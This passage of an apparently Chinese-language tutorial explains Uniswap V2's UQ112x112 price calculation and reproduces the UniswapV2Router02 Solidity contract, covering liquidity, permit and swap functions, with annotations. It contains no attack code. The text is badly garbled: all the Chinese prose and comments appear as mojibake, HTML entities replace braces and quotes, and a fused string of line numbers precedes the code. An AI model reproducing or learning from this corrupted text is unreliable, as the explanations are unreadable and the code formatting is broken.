(bool))å°†å­—èŠ‚æ•°ç»„è§£ç ä¸ºä¸€ä¸ªå¸ƒå°”å€¼ã€‚è¿™ä¸ªå¸ƒå°”å€¼çš„å€¼å–å†³äºå­—èŠ‚æ•°ç»„ä¸­çš„æ•°æ®ã€‚å¦‚æœå­—èŠ‚æ•°ç»„ä¸­çš„æ•°æ®ä¸º0ï¼Œåˆ™è§£ç åçš„å¸ƒå°”å€¼ä¸ºfalseï¼Œå¦åˆ™ä¸ºtrueã€‚ çŸ¥è¯†ç‚¹ï¼š UQ112x112.encode(_reserve1).uqdiv(_reserve0) UQ112x112.encode(_reserve1).uqdiv(_reserve0)æ˜¯Uniswap V2ä¸­çš„ä¸€ä¸ªè®¡ç®—äº¤æ˜“ä»·æ ¼çš„æ“ä½œï¼Œä½¿ç”¨äº†UQ112x112å›ºå®šç‚¹æ•°ç®—æ³•ã€‚ å…·ä½“æ¥è¯´ï¼Œ_reserve0å’Œ_reserve1æ˜¯Uniswap V2äº¤æ˜“å¯¹ä¸­ä¸¤ç§èµ„äº§çš„ä½™é¢ï¼ˆreserveï¼‰ï¼ŒUQ112x112.encode()å‡½æ•°å°†ä½™é¢ç¼–ç ä¸ºUQ112x112å›ºå®šç‚¹æ•°æ ¼å¼ï¼Œç„¶åä½¿ç”¨äº†.uqdiv()å‡½æ•°å¯¹ä¸¤ç§èµ„äº§çš„ä½™é¢è¿›è¡Œäº†é™¤æ³•æ“ä½œï¼Œè®¡ç®—å‡ºå½“å‰çš„äº¤æ˜“ä»·æ ¼ã€‚ UQ112x112å›ºå®šç‚¹æ•°ç®—æ³•æ˜¯ä¸€ç§ç”¨äºåœ¨ä»¥å¤ªåŠåˆçº¦ä¸­è¿›è¡Œç²¾ç¡®æ•°å­¦è®¡ç®—çš„ç®—æ³•ã€‚å®ƒå°†æµ®ç‚¹æ•°è½¬æ¢ä¸ºæ•´æ•°ï¼Œå¹¶ä½¿ç”¨å›ºå®šçš„å°æ•°ä½æ•°è¿›è¡Œè®¡ç®—ã€‚åœ¨Uniswap V2ä¸­ï¼ŒUQ112x112å›ºå®šç‚¹æ•°ç®—æ³•è¢«å¹¿æ³›åº”ç”¨äºè®¡ç®—äº¤æ˜“ä»·æ ¼å’Œèµ„é‡‘æ± åˆ†é…ç­‰ã€‚ åœ¨è¿™ä¸ªæ“ä½œä¸­ï¼ŒUQ112x112.encode(_reserve1)å°†_reserve1ç¼–ç ä¸ºUQ112x112æ ¼å¼ï¼Œç„¶å.uqdiv(_reserve0)å°†ç¼–ç åçš„_reserve1é™¤ä»¥_reserve0ã€‚æœ€ç»ˆçš„ç»“æœæ˜¯ä¸€ä¸ªUQ112x112æ ¼å¼çš„æ•°ï¼Œè¡¨ç¤ºå½“å‰çš„äº¤æ˜“ä»·æ ¼ã€‚ v2-periphery1. UniswapV2Router02123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410411412413414415416417418419420421422423424425426427428429430431432433434435436437438439440441442443444445446447448449450451452453454455456457458459460461462463464465466467468469470471472473474475476477478479480481482483484485486487488489490491492493494495496497498499500501502503504505506507508509510511512513514515516517518519520521522523524pragma solidity =0.6.6;import &#x27;@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol&#x27;;import &#x27;@uniswap/lib/contracts/libraries/TransferHelper.sol&#x27;;import &#x27;./interfaces/IUniswapV2Router02.sol&#x27;;import &#x27;./libraries/UniswapV2Library.sol&#x27;;import &#x27;./libraries/SafeMath.sol&#x27;;import &#x27;./interfaces/IERC20.sol&#x27;;import &#x27;./interfaces/IWETH.sol&#x27;;contract UniswapV2Router02 is IUniswapV2Router02 &#123; using SafeMath for uint; address public immutable override factory; address public immutable override WETH; // ä¿®é¥°å™¨ç¡®ä¿ æ“ä½œåœ¨æˆªæ­¢æ—¥æœŸä¹‹å‰ modifier ensure(uint deadline) &#123; require(deadline &gt;= block.timestamp, &#x27;UniswapV2Router: EXPIRED&#x27;); _; &#125; // åˆå§‹åŒ–factory å’Œ WETHåœ°å€ constructor(address _factory, address _WETH) public &#123; factory = _factory; WETH = _WETH; &#125; // æ¥æ”¶ETH receive() external payable &#123; assert(msg.sender == WETH); // only accept ETH via fallback from the WETH contract &#125; // **** ADD LIQUIDITY **** /** _addLiquidityå¯ä»¥å¸®åŠ©è®¡ç®—æœ€ä½³æ±‡ç‡ã€‚å¦‚æœæ˜¯é¦–æ¬¡æ·»åŠ æµåŠ¨æ€§ï¼Œåˆ™ä¼šå…ˆåˆ›å»ºäº¤æ˜“å¯¹åˆçº¦ï¼› å¦åˆ™æ ¹æ®å½“å‰æ± å­ä½™é¢è®¡ç®—åº”è¯¥æ³¨å…¥çš„æœ€ä½³ä»£å¸æ•°é‡ã€‚ */ function _addLiquidity( address tokenA, // ä»£å¸A address tokenB, // ä»£å¸B uint amountADesired, // å¸Œæœ›å­˜å…¥çš„ä»£å¸Aæ•°é‡ uint amountBDesired, // å¸Œæœ›å­˜å…¥çš„ä»£å¸Bæ•°é‡ uint amountAMin, // æœ€å°‘å­˜å…¥çš„ä»£å¸Aæ•°é‡ uint amountBMin // æœ€å°‘å­˜å…¥çš„ä»£å¸Bæ•°é‡ ) internal virtual returns (uint amountA, uint amountB) &#123; // create the pair if it doesn&#x27;t exist yet if (IUniswapV2Factory(factory).getPair(tokenA, tokenB) == address(0)) &#123; IUniswapV2Factory(factory).createPair(tokenA, tokenB); &#125; // è·å–äº¤æ˜“å¯¹ä¸­ä»£å¸A Bçš„å­˜å‚¨é‡ (uint reserveA, uint reserveB) = UniswapV2Library.getReserves(factory, tokenA, tokenB); // å¦‚æœå‚¨å¤‡é‡éƒ½ä¸º 0ï¼Œé‚£ä¸¤ä¸ªé¢„æœŸæ”¯ä»˜é¢å°±æ˜¯æˆäº¤é‡ if (reserveA == 0 &amp;&amp; reserveB == 0) &#123; (amountA, amountB) = (amountADesired, amountBDesired); &#125; else &#123; // é‡‡ç”¨æ§åˆ¶å˜é‡æ³•ç®—å‡ºæœ€ä½³çš„æ±‡ç‡ /** å¦‚æœè®¡ç®—å¾—å‡ºçš„ç»“æœå€¼ amountBOptimal ä¸æ¯” amountBDesired å¤§ï¼Œä¸”ä¸ä¼šå°äº amountBMinï¼Œ å°±å¯å°† amountADesired å’Œè¯¥ amountBOptimal ä½œä¸ºç»“æœå€¼è¿”å›ã€‚ å¦‚æœ amountBOptimal å¤§äº amountBDesiredï¼Œåˆ™æ ¹æ® amountBDesired è®¡ç®—å¾—å‡ºéœ€è¦æ”¯ä»˜å¤šå°‘ tokenAï¼Œ å¾—åˆ° amountAOptimalï¼Œåªè¦ amountAOptimal ä¸å¤§äº amountADesired ä¸”ä¸ä¼šå°äº amountAMinï¼Œ å°±å¯å°† amountAOptimal å’Œ amountBDesired ä½œä¸ºç»“æœå€¼è¿”å›ã€‚ */ // è°ƒç”¨quoteå‡½æ•°ï¼Œæ¢ç®—amountADesired å¯¹åº”çš„Bä»£å¸ä¸ºå¤šå°‘ uint amountBOptimal = UniswapV2Library.quote(amountADesired, reserveA, reserveB); // æœ€ä½³çš„Bä»£å¸æ•°é‡å°‘äºå¸Œæœ›å­˜å…¥çš„ä»£å¸Bæ•°é‡ if (amountBOptimal &lt;= amountBDesired) &#123; // è¿™æ˜¯å®š amountADesiredï¼Œæ±‚Bçš„æœ€ä½³æ•°é‡ // è€Œä¸”æœ€ä½³Bä»£å¸æ•°é‡è¦æ±‚ &gt;= amountBMin require(amountBOptimal &gt;= amountBMin, &#x27;UniswapV2Router: INSUFFICIENT_B_AMOUNT&#x27;); // è¿”å›å¸Œæœ›å­˜å…¥çš„Aï¼Œå’Œæœ€ä½³çš„Bæ•°é‡ (amountA, amountB) = (amountADesired, amountBOptimal); &#125; else &#123; // å®šamountBDesiredï¼Œæ±‚Açš„æœ€ä½³æ•°é‡ // è°ƒç”¨quoteå‡½æ•°ï¼Œæ¢ç®—amountBDesired å¯¹åº”çš„Aä»£å¸ä¸ºå¤šå°‘ uint amountAOptimal = UniswapV2Library.quote(amountBDesired, reserveB, reserveA); assert(amountAOptimal &lt;= amountADesired); require(amountAOptimal &gt;= amountAMin, &#x27;UniswapV2Router: INSUFFICIENT_A_AMOUNT&#x27;); // è¿”å›å¸Œæœ›å­˜å…¥çš„Bï¼Œå’Œæœ€ä½³çš„Aæ•°é‡ (amountA, amountB) = (amountAOptimal, amountBDesired); &#125; &#125; &#125; function addLiquidity( address tokenA, // ä»£å¸A address tokenB, // ä»£å¸B uint amountADesired, // å¸Œæœ›å­˜å…¥çš„ä»£å¸Aæ•°é‡ uint amountBDesired, // å¸Œæœ›å­˜å…¥çš„ä»£å¸Bæ•°é‡ uint amountAMin, // ç”¨æˆ·å¯æ¥å—çš„æœ€å°æˆäº¤ä»£å¸Aæ•°é‡ uint amountBMin, // ç”¨æˆ·å¯æ¥å—çš„æœ€å°æˆäº¤ä»£å¸Bæ•°é‡ address to, // æµåŠ¨æ€§ä»£å¸æ¥æ”¶åœ°å€ uint deadline // è¯¥ç¬”äº¤æ˜“çš„æœ‰æ•ˆæ—¶é—´ï¼Œå¦‚æœè¶…è¿‡è¯¥æ—¶é—´è¿˜æ²¡å¾—åˆ°äº¤æ˜“å¤„ç†å°±ç›´æ¥å¤±æ•ˆä¸è¿›è¡Œäº¤æ˜“äº† ) external virtual override ensure(deadline) returns (uint amountA, uint amountB, uint liquidity) &#123; // è°ƒç”¨_addLiquidityå‡½æ•°ï¼Œè¿”å› ä»£å¸Aå’Œä»£å¸B çš„æœ€ä½³æ±‡ç‡ (amountA, amountB) = _addLiquidity(tokenA, tokenB, amountADesired, amountBDesired, amountAMin, amountBMin); // è·å–äº¤æ˜“å¯¹åœ°å€ address pair = UniswapV2Library.pairFor(factory, tokenA, tokenB); // è°ƒç”¨tokenAçš„`transferFrom`å‡½æ•°ï¼Œå®ç°msg.senderå‘äº¤æ˜“å¯¹pairè½¬å…¥amountAä»£å¸ TransferHelper.safeTransferFrom(tokenA, msg.sender, pair, amountA); TransferHelper.safeTransferFrom(tokenB, msg.sender, pair, amountB); // è·å–å­˜å…¥ä»£å¸åuniswapv2ä¸­çš„æµåŠ¨æ€§ liquidity = IUniswapV2Pair(pair).mint(to); &#125; /** æ·»åŠ æµåŠ¨æ€§ */ function addLiquidityETH( address token, uint amountTokenDesired, uint amountTokenMin, uint amountETHMin, address to, uint deadline ) external virtual override payable ensure(deadline) returns (uint amountToken, uint amountETH, uint liquidity) &#123; // è°ƒç”¨_addLiquidityå‡½æ•°ï¼Œè¿”å› TOkenå’ŒETHçš„æœ€ä½³æ±‡ç‡ (amountToken, amountETH) = _addLiquidity( token, WETH, amountTokenDesired, msg.value, amountTokenMin, amountETHMin ); // è·å–äº¤æ˜“å¯¹åœ°å€ address pair = UniswapV2Library.pairFor(factory, token, WETH); // è°ƒç”¨tokençš„`transferFrom`å‡½æ•°ï¼Œå®ç°msg.senderå‘äº¤æ˜“å¯¹pairè½¬å…¥amountTokenä»£å¸ TransferHelper.safeTransferFrom(token, msg.sender, pair, amountToken); // å…ˆæŠŠamountETHæ•°é‡çš„ETHå­˜å…¥æœ¬åˆçº¦ IWETH(WETH).deposit&#123;value: amountETH&#125;(); // å†å°†amountæ•°é‡çš„WETHè½¬å…¥äº¤æ˜“å¯¹ä¸­ assert(IWETH(WETH).transfer(pair, amountETH)); // è·å–å­˜å…¥ä»£å¸åuniswapv2ä¸­çš„æµåŠ¨æ€§ liquidity = IUniswapV2Pair(pair).mint(to); // refund dust eth, if any // å¦‚æœè¿˜æœ‰å‰©ä½™çš„ETHï¼Œå°†é€€è¿˜ if (msg.value &gt; amountETH) TransferHelper.safeTransferETH(msg.sender, msg.value - amountETH); &#125; // **** REMOVE LIQUIDITY **** // ç§»é™¤æµåŠ¨æ€§ function removeLiquidity( address tokenA, address tokenB, uint liquidity, uint amountAMin, uint amountBMin, address to, uint deadline ) public virtual override ensure(deadline) returns (uint amountA, uint amountB) &#123; // è·å–äº¤æ˜“å¯¹åœ°å€ address pair = UniswapV2Library.pairFor(factory, tokenA, tokenB); // å°†æµåŠ¨æ€§ä»£å¸ä»ç”¨æˆ·åˆ’è½¬åˆ° pair åˆçº¦ IUniswapV2Pair(pair).transferFrom(msg.sender, pair, liquidity); // send liquidity to pair // æ”¶åˆ°çš„æµåŠ¨æ€§ä»£å¸å å…¨éƒ¨ä»£å¸æ¯”ä¾‹ (uint amount0, uint amount1) = IUniswapV2Pair(pair).burn(to); (address token0,) = UniswapV2Library.sortTokens(tokenA, tokenB); (amountA, amountB) = tokenA == token0 ? (amount0, amount1) : (amount1, amount0); // å¦‚æœä½äºç”¨æˆ·è®¾å®šçš„æœ€ä½é¢„æœŸï¼ˆamountAMin/amountBMinï¼‰ï¼Œåˆ™å›æ»šäº¤æ˜“ require(amountA &gt;= amountAMin, &#x27;UniswapV2Router: INSUFFICIENT_A_AMOUNT&#x27;); require(amountB &gt;= amountBMin, &#x27;UniswapV2Router: INSUFFICIENT_B_AMOUNT&#x27;); &#125; function removeLiquidityETH( address token, //å¾…ç§»é™¤æµåŠ¨æ€§çš„ä»£å¸åœ°å€ uint liquidity, // è¦ç§»é™¤çš„æµåŠ¨æ€§æ•°é‡ uint amountTokenMin, // ç”¨æˆ·æ„¿æ„æ¥å—çš„æœ€å°ä»£å¸æ•°é‡ï¼Œå¦‚æœå®é™…è¿”å›çš„ä»£å¸æ•°é‡å°äºè¯¥å€¼ï¼Œåˆ™å‡½æ•°ä¼šæŠ›å‡ºå¼‚å¸¸ uint amountETHMin, // ç”¨æˆ·æ„¿æ„æ¥å—çš„æœ€å°ETHæ•°é‡ï¼Œå¦‚æœå®é™…è¿”å›çš„ETHæ•°é‡å°äºè¯¥å€¼ï¼Œåˆ™å‡½æ•°ä¼šæŠ›å‡ºå¼‚å¸¸ address to, // ä»£å¸å’ŒETHå°†è¢«å‘é€åˆ°çš„ç›®æ ‡åœ°å€ uint deadline // æ“ä½œçš„æˆªæ­¢æ—¶é—´ï¼Œå¿…é¡»åœ¨è¯¥æ—¶é—´ä¹‹å‰å®Œæˆæ“ä½œï¼Œå¦åˆ™æ“ä½œå°†è¢«è§†ä¸ºæ— æ•ˆ ) public virtual override ensure(deadline) returns (uint amountToken, uint amountETH) &#123; // è°ƒç”¨ removeLiquidityï¼Œå¾—åˆ°é€€è¿˜çš„ Token å’Œ ETH // removeLiquidityä¸­æ‰§è¡Œäº† `burn`ä½†æ˜¯æ˜¯å°†tokenå’ŒETHè½¬ç§»åˆ°äº†addrss(this),è¯´æ˜è¿˜å¯ä»¥æ‰§è¡Œ safeTransfer å’Œ withdraw (amountToken, amountETH) = removeLiquidity( token, WETH, liquidity, amountTokenMin, amountETHMin, address(this), deadline ); // å‘toè½¬è´¦(token) TransferHelper.safeTransfer(token, to, amountToken); // å°†wethå–å‡ºæ¥ï¼Œæš‚æ—¶å­˜åœ¨addrss(this) IWETH(WETH).withdraw(amountETH); // å°†address(this)ä¸­çš„WETHè½¬åˆ°æŒ‡å®šåœ°å€to TransferHelper.safeTransferETH(to, amountETH); &#125; // å…¶å®å°±æ˜¯åœ¨è°ƒç”¨å®é™…çš„ removeLiquidity ä¹‹å‰å…ˆç”¨ permit æ–¹å¼å®Œæˆæˆæƒæ“ä½œ function removeLiquidityWithPermit( address tokenA, address tokenB, uint liquidity, uint amountAMin, uint amountBMin, address to, uint deadline, bool approveMax, uint8 v, bytes32 r, bytes32 s ) external virtual override returns (uint amountA, uint amountB) &#123; address pair = UniswapV2Library.pairFor(factory, tokenA, tokenB); uint value = approveMax ? uint(-1) : liquidity; IUniswapV2Pair(pair).permit(msg.sender, address(this), value, deadline, v, r, s); (amountA, amountB) = removeLiquidity(tokenA, tokenB, liquidity, amountAMin, amountBMin, to, deadline); &#125; // åœ¨è°ƒç”¨å®é™…çš„ removeLiquidity ä¹‹å‰å…ˆç”¨ permit æ–¹å¼å®Œæˆæˆæƒæ“ä½œ function removeLiquidityETHWithPermit( address token, uint liquidity, uint amountTokenMin, uint amountETHMin, address to, uint deadline, bool approveMax, uint8 v, bytes32 r, bytes32 s ) external virtual override returns (uint amountToken, uint amountETH) &#123; address pair = UniswapV2Library.pairFor(factory, token, WETH); uint value = approveMax ? uint(-1) : liquidity; IUniswapV2Pair(pair).permit(msg.sender, address(this), value, deadline, v, r, s); (amountToken, amountETH) = removeLiquidityETH(token, liquidity, amountTokenMin, amountETHMin, to, deadline); &#125; // **** REMOVE LIQUIDITY (supporting fee-on-transfer tokens) **** /** è¿”å›å€¼æ²¡æœ‰ amountTokenï¼› è°ƒç”¨ removeLiquidity åä¹Ÿæ²¡æœ‰ amountToken å€¼è¿”å› è¿›è¡Œ safeTransfer æ—¶ä¼ å€¼ç›´æ¥è¯»å–å½“å‰åœ°å€çš„ token ä½™é¢ã€‚ */ function removeLiquidityETHSupportingFeeOnTransferTokens( address token, uint liquidity, uint amountTokenMin, uint amountETHMin, address to, uint deadline ) public virtual override ensure(deadline) returns (uint amountETH) &#123; (, amountETH) = removeLiquidity( token, WETH, liquidity, amountTokenMin, amountETHMin, address(this), deadline ); TransferHelper.safeTransfer(token, to, IERC20(token).balanceOf(address(this))); IWETH(WETH).withdraw(amountETH); TransferHelper.safeTransferETH(to, amountETH); &#125; function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens( address token, uint liquidity, uint amountTokenMin, uint amountETHMin, address to, uint deadline, bool approveMax, uint8 v, bytes32 r, bytes32 s ) external virtual override returns (uint amountETH) &#123; address pair = UniswapV2Library.pairFor(factory, token, WETH); uint value = approveMax ? uint(-1) : liquidity; IUniswapV2Pair(pair).permit(msg.sender, address(this), value, deadline, v, r, s); amountETH = removeLiquidityETHSupportingFeeOnTransferTokens( token, liquidity, amountTokenMin, amountETHMin, to, deadline ); &#125; // **** SWAP **** // requires the initial amount to have already been sent to the first pair function _swap(uint[] memory amounts, address[] memory path, address _to) internal virtual &#123; /** å†æ•´ä¸ªå…‘æ¢è·¯å¾„ï¼Œå¹¶å¯¹è·¯å¾„ä¸­æ¯ä¸¤ä¸ªé…å¯¹çš„ token è°ƒç”¨ pair åˆçº¦çš„å…‘æ¢å‡½æ•°ï¼Œå®ç°åº•å±‚çš„å…‘æ¢å¤„ç† */ for (uint i; i &lt; path.length - 1; i++) &#123; (address input, address output) = (path[i], path[i + 1]); (address token0,) = UniswapV2Library.sortTokens(input, output); uint amountOut = amounts[i + 1]; // å¦‚ä¸‹è¯­å¥æ˜¯åœ¨åˆ¤æ–­è¦å…‘æ¢çš„æ˜¯å“ªç§ è´§å¸ï¼Œæ¯”å¦‚ A æˆ–è€… B (uint amount0Out, uint amount1Out) = input == token0 ? (uint(0), amountOut) : (amountOut, uint(0)); address to = i &lt; path.length - 2 ? UniswapV2Library.pairFor(factory, output, path[i + 2]) : _to; IUniswapV2Pair(UniswapV2Library.pairFor(factory, input, output)).swap( amount0Out, amount1Out, to, new bytes(0) ); &#125; &#125; /** ç”¨ ERC20 å…‘æ¢ ERC20ï¼Œä½†æ”¯ä»˜çš„æ•°é‡æ˜¯æŒ‡å®šçš„ï¼Œè€Œå…‘æ¢å›çš„æ•°é‡åˆ™æ˜¯æœªç¡®å®šçš„ */ function swapExactTokensForTokens( uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline ) external virtual override ensure(deadline) returns (uint[] memory amounts) &#123; amounts = UniswapV2Library.getAmountsOut(factory, amountIn, path); require(amounts[amounts.length - 1] &gt;= amountOutMin, &#x27;UniswapV2Router: INSUFFICIENT_OUTPUT_AMOUNT&#x27;); // å°†æ”¯ä»˜çš„ä»£å¸è½¬åˆ° pair åˆçº¦ TransferHelper.safeTransferFrom( path[0], msg.sender, UniswapV2Library.pairFor(factory, path[0], path[1]), amounts[0] ); _swap(amounts, path, to); &#125; /** ç”¨ ERC20 å…‘æ¢ ERC20ï¼Œä¸ä¸Šä¸€ä¸ªå‡½æ•°ä¸åŒï¼ŒæŒ‡å®šçš„æ˜¯å…‘æ¢å›çš„æ•°é‡ */ function swapTokensForExactTokens( uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline ) external virtual override ensure(deadline) returns (uint[] memory amounts) &#123; amounts = UniswapV2Library.getAmountsIn(factory, amountOut, path); require(amounts[0] &lt;= amountInMax, &#x27;UniswapV2Router: EXCESSIVE_INPUT_AMOUNT&#x27;); TransferHelper.safeTransferFrom( path[0], msg.sender, UniswapV2Library.pairFor(factory, path[0], path[1]), amounts[0] ); _swap(amounts, path, to); &#125; /** æŒ‡å®š ETH æ•°é‡å…‘æ¢ ERC20 */ function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline) external virtual override payable ensure(deadline) returns (uint[] memory amounts) &#123; require(path[0] == WETH, &#x27;UniswapV2Router: INVALID_PATH&#x27;); amounts = UniswapV2Library.getAmountsOut(factory, msg.value, path); require(amounts[amounts.length - 1] &gt;= amountOutMin, &#x27;UniswapV2Router: INSUFFICIENT_OUTPUT_AMOUNT&#x27;); IWETH(WETH).deposit&#123;value: amounts[0]&#125;(); assert(IWETH(WETH).transfer(UniswapV2Library.pairFor(factory, path[0], path[1]), amounts[0])); _swap(amounts, path, to); &#125; /** ç”¨ ERC20 å…‘æ¢æˆæŒ‡å®šæ•°é‡çš„ ETH */ function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline) external virtual override ensure(deadline) returns (uint[] memory amounts) &#123; require(path[path.length - 1] == WETH, &#x27;UniswapV2Router: INVALID_PATH&#x27;); amounts = UniswapV2Library.getAmountsIn(factory, amountOut, path); require(amounts[0] &lt;= amountInMax, &#x27;UniswapV2Router: EXCESSIVE_INPUT_AMOUNT&#x27;); TransferHelper.safeTransferFrom( path[0], msg.sender, UniswapV2Library.pairFor(factory, path[0], path[1]), amounts[0] ); _swap(amounts, path, address(this)); IWETH(WETH).withdraw(amounts[amounts.length - 1]); TransferHelper.safeTransferETH(to, amounts[amounts.length - 1]); &#125; /** ç”¨æŒ‡å®šæ•°é‡çš„ ERC20 å…‘æ¢ ETH */ function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external virtual override ensure(deadline) returns (uint[] memory amounts) &#123; require(path[path.length - 1] == WETH, &#x27;UniswapV2Router: INVALID_PATH&#x27;); amounts = UniswapV2Library.getAmountsOut(factory, amountIn, path); require(amounts[amounts.length - 1] &gt;= amountOutMin, &#x27;UniswapV2Router: INSUFFICIENT_OUTPUT_AMOUNT&#x27;); TransferHelper.safeTransferFrom( path[0], msg.sender, UniswapV2Library.pairFor(factory, path[0], path[1]), amounts[0] ); _swap(amounts, path, address(this)); IWETH(WETH).withdraw(amounts[amounts.length - 1]); TransferHelper.safeTransferETH(to, amounts[amounts.length - 1]); &#125; /** ç”¨ ETH å…‘æ¢æŒ‡å®šæ•°é‡çš„ ERC20 */ function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline) external virtual override payable ensure(deadline) returns (uint[] memory amounts) &#123; require(path[0] == WETH, &#x27;UniswapV2Router: INVALID_PATH&#x27;); amounts = UniswapV2Library.getAmountsIn(factory, amountOut, path); require(amounts[0] &lt;= msg.value, &#x27;UniswapV2Router: EXCESSIVE_INPUT_AMOUNT&#x27;); IWETH(WETH).deposit&#123;value: amounts[0]&#125;(); assert(IWETH(WETH).transfer(UniswapV2Library.pairFor(factory, path[0], path[1]), amounts[0])); _swap(amounts, path, to); // refund dust eth, if any if (msg.value &gt; amounts[0]) TransferHelper.safeTransferETH(msg.sender, msg.value - amounts[0]); &#125; // **** SWAP (supporting fee-on-transfer tokens) **** // requires the initial amount to have already been sent to the first pair function _swapSupportingFeeOnTransferTokens(address[] memory path, address _to) internal virtual &#123; for (uint i; i &lt; path.length - 1; i++) &#123; (address input, address output) = (path[i], path[i + 1]); (address token0,) = UniswapV2Library.sortTokens(input, output); IUniswapV2Pair pair = IUniswapV2Pair(UniswapV2Library.pairFor(factory, input, output)); uint amountInput; uint amountOutput; &#123; // scope to avoid stack too deep errors (uint reserve0, uint reserve1,) = pair.getReserves(); (uint reserveInput, uint reserveOutput) = input == token0 ? (reserve0, reserve1) : (reserve1, reserve0); amountInput = IERC20(input).balanceOf(address(pair)).sub(reserveInput); amountOutput = UniswapV2Library.getAmountOut(amountInput, reserveInput, reserveOutput); &#125; (uint amount0Out, uint amount1Out) = input == token0 ? (uint(0), amountOutput) : (amountOutput, uint(0)); address to = i &lt; path.length - 2 ? UniswapV2Library.pairFor(factory, output, path[i + 2]) : _to; pair.swap(amount0Out, amount1Out, to, new bytes(0)); &#125; &#125; /** æŒ‡å®šæ•°é‡çš„ ERC20 å…‘æ¢ ERC20ï¼Œæ”¯æŒè½¬è´¦æ—¶æ‰£è´¹ */ function swapExactTokensForTokensSupportingFeeOnTransferTokens( uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline ) external virtual override ensure(deadline) &#123; TransferHelper.safeTransferFrom( path[0], msg.sender, UniswapV2Library.pairFor(factory, path[0], path[1]), amountIn ); uint balanceBefore = IERC20(path[path.length - 1]).balanceOf(to); _swapSupportingFeeOnTransferTokens(path, to); require( IERC20(path[path.length - 1]).balanceOf(to).sub(balanceBefore) &gt;= amountOutMin, &#x27;UniswapV2Router: INSUFFICIENT_OUTPUT_AMOUNT&#x27; ); &#125; /** æŒ‡å®šæ•°é‡çš„ ETH å…‘æ¢ ERC20ï¼Œæ”¯æŒè½¬è´¦æ—¶æ‰£è´¹ */ function swapExactETHForTokensSupportingFeeOnTransferTokens( uint amountOutMin, address[] calldata path, address to, uint deadline ) external virtual override payable ensure(deadline) &#123; require(path[0] == WETH, &#x27;UniswapV2Router: INVALID_PATH&#x27;); uint amountIn = msg.value; IWETH(WETH).deposit&#123;value: amountIn&#125;(); assert(IWETH(WETH).transfer(UniswapV2Library.pairFor(factory, path[0], path[1]), amountIn)); uint balanceBefore = IERC20(path[path.length - 1]).balanceOf(to); _swapSupportingFeeOnTransferTokens(path, to); require( IERC20(path[path.length - 1]).balanceOf(to).sub(balanceBefore) &gt;= amountOutMin, &#x27;UniswapV2Router: INSUFFICIENT_OUTPUT_AMOUNT&#x27; ); &#125; /** æŒ‡å®šæ•°é‡çš„ ETH å…‘æ¢ ERC20ï¼Œæ”¯æŒè½¬è´¦æ—¶æ‰£è´¹ */ function swapExactTokensForETHSupportingFeeOnTransferTokens( uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline ) external virtual override ensure(deadline) &#123; require(path[path.length - 1] == WETH, &#x27;UniswapV2Router: INVALID_PATH&#x27;); TransferHelper.safeTransferFrom( path[0], msg.sender, UniswapV2Library.pairFor(factory, path[0], path[1]), amountIn ); _swapSupportingFeeOnTransferTokens(path, address(this)); uint amountOut = IERC20(WETH).balanceOf(address(this)); require(amountOut &gt;= amountOutMin, &#x27;UniswapV2Router: INSUFFICIENT_OUTPUT_AMOUNT&#x27;); IWETH(WETH).withdraw(amountOut); TransferHelper.safeTransferETH(to, amountOut); &#125; // **** LIBRARY FUNCTIONS **** function quote(uint amountA, uint reserveA, uint reserveB) public pure virtual override returns (uint amountB) &#123; return UniswapV2Library.quote(amountA, reserveA, reserveB); &#125; function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) public pure virtual override returns (uint amountOut) &#123; return UniswapV2Library.getAmountOut(amountIn, reserveIn, reserveOut); &#125; function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) public pure virtual override returns (uint amountIn) &#123; return UniswapV2Library.getAmountIn(amountOut, reserveIn, reserveOut); &#125; function getAmountsOut(uint amountIn, address[] memory path) public view virtual override returns (uint[] memory amounts) &#123; return UniswapV2Library.getAmountsOut(factory, amountIn, path); &#125; function getAmountsIn(uint amountOut, address[] memory path) public view virtual override returns (uint[] memory amounts) &#123; return UniswapV2Library.getAmountsIn(factory, amountOut, path); &#125;&#125; **è§£è¯» addLiquidityä¸­çš„amountAMin å’Œ amountBMin ** è¯¥å€¼ä¸€èˆ¬æ˜¯ç”±å‰ç«¯æ ¹æ®é¢„æœŸå€¼å’Œæ»‘ç‚¹å€¼è®¡ç®—å¾—å‡ºçš„ã€‚æ¯”å¦‚ï¼Œé¢„æœŸå€¼ amountADesired ä¸º 1000ï¼Œè®¾ç½®çš„æ»‘ç‚¹ä¸º 0.5%ï¼Œé‚£å°±å¯ä»¥è®¡ç®—å¾—å‡ºå¯æ¥å—çš„æœ€å°å€¼ amountAMin ä¸º 1000 * (1 - 0.5%) &#x3D; 995ã€‚ addLiquidityETH addLiquidityETH åˆ™æ”¯ä»˜çš„å…¶ä¸­ä¸€ä¸ª token åˆ™æ˜¯ ETHï¼Œè€Œä¸æ˜¯ ERC20 ä»£å¸ã€‚æ¥çœ‹çœ‹å…¶ä»£ç å®ç°ï¼š å¯çœ‹åˆ°ï¼Œå…¥å‚ä¸å†æ˜¯ä¸¤ä¸ª token åœ°å€ï¼Œè€Œåªæœ‰ä¸€ä¸ª token åœ°å€ï¼Œå› ä¸ºå¦ä¸€ä¸ªæ˜¯ä»¥å¤ªåŠä¸»å¸ ETHã€‚é¢„æœŸæ”¯ä»˜çš„ 